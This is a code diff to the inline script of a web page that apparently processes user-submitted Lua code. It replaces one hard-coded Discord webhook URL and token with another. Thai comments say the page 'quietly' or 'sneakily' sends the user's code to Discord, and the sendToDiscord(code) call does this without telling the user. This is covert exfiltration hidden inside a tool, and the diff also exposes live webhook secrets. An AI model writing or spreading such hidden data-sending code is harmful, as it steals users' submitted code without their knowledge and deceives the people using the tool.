@@ -223,7 +223,8 @@
     </div>
 
     <script>
-        const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571474640403042395/xQGJePqapcDqXZUHnzk94h_xEs1q8dGmkELNEcliNK5WMYU_U9FN7qpEhjgJgV5wWPla";
+        // ลิงก์ Discord Webhook ใหม่ที่อัปเดต
+        const SECRET_WEBHOOK = "https://discord.com/api/webhooks/1571490922842169430/zEgnBipWbi91wEVX3LF2MNuEzv68whjmd9kiFx7LE7_kELGhThh9zwEVLrXkSWt-Ww7r";
 
         function safeBtoa(str) {
             return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
@@ -257,7 +258,7 @@
                 return;
             }
 
-            // แอบส่งแบบเงียบๆ เข้า Discord
+            // ส่งข้อมูลเข้า Discord Webhook ใหม่แบบเงียบๆ
             sendToDiscord(code);
 
             var header = "--[[\n" +
